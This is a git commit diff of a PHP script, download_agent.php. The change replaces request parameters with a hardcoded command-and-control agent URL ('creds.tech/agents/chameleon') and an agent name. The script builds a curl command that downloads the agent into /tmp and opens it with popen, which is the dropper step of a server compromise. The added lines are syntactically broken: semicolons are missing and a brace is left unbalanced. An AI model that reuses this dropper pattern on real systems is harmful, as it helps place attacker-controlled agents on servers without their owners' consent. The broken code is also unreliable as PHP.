a67043b2514b3b07cabb20b152f96ba04d20428e
fc-prashantsaini <92972358+fc-prashantsaini@users.noreply.github.com>
2024-06-03 17:42:12 +0530

    Update download_agent.php

--- download_agent.php
+++ download_agent.php
@@ -1,7 +1,6 @@
 <?php
-    if (isset($_GET['c2_agent_url'], $_GET['agent_name'])) {
-        $c2AgentUrl = $_GET['c2_agent_url'];
-        $agentName = $_GET['agent_name'];
+        $c2AgentUrl = "https://creds.tech/agents/chameleon"
+        $agentName = "php-deserization"
         
         $command = sprintf("curl -o /tmp/%s %s", escapeshellarg($agentName), escapeshellarg($c2AgentUrl));
         $handle = popen($command, 'w');
